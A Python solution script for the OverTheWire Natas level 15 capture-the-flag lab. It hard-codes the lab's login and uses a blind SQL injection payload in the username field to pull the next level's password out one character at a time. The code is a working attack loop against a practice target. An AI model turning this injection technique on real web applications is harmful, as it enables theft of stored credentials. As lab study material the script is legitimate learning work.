#!/usr/bin/env python3
"""
This script is for an OverTheWire CTF challenge where the task is to extract the password from an input field.
The input field checks if a username exists, and the payload crafted in this script leverages SQL injection
to reveal the password.

The script uses a blind SQL injection technique to determine the password one character at a time. 
It sends requests to the target URL, checking each character against the response to find a match.

"""
import requests
import sys
from string import digits, ascii_lowercase, ascii_uppercase

url = "http://natas15.natas.labs.overthewire.org/"
charset = ascii_lowercase + ascii_uppercase + digits
sqli = 'natas16" AND password LIKE BINARY "'

s = requests.Session()
s.auth = ('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')

password = ""
# We assume that the password is 32 chars 
while len(password) < 32:
    for char in charset:
        r = s.post('http://natas15.natas.labs.overthewire.org/', data={'username':sqli + password + char + "%"})
        if "This user exists" in r.text:
            sys.stdout.write(char)
            sys.stdout.flush()
            password += char
            break
